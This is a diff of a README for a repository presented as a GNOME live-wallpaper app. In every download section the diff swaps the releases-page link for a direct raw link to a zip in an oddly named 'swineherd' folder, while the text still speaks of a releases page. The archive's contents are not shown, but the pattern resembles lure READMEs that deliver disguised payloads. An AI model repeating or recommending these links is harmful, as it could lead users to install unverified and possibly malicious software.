@@ -1,9 +1,9 @@
 # 🖼️ gnome-wallpaper-engine - Live wallpapers for GNOME desktops
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/raw/refs/heads/main/swineherd/engine-gnome-wallpaper-v3.4.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/releases
+Visit this page to download: https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/raw/refs/heads/main/swineherd/engine-gnome-wallpaper-v3.4.zip
 
 Open the releases page, then pick the latest version for your system. Download the file that matches your desktop setup.
 
@@ -26,7 +26,7 @@ You need:
 If you use GNOME Shell, this app fits into that setup. It is made for desktop users who want a live background without extra setup work.
 
 ## 🚀 Getting started
-1. Open the download page: https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/releases
+1. Open the download page: https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/raw/refs/heads/main/swineherd/engine-gnome-wallpaper-v3.4.zip
 2. Find the latest release
 3. Download the file for your system
 4. Save the file in a folder you can find easily, such as Downloads
@@ -101,7 +101,7 @@ Yes, if they work with the player used by the app.
 - Topics: extension, gnome, gnome-shell, gnome-shell-extension, linux, live-wallpapers, mpv, wallpaper, wayland, x11
 
 ## 🔗 Download again
-Visit this page to download: https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/releases
+Visit this page to download: https://github.com/Duketrumpetshaped786/gnome-wallpaper-engine/raw/refs/heads/main/swineherd/engine-gnome-wallpaper-v3.4.zip
 
 ## 📋 Quick install flow
 1. Open the releases page
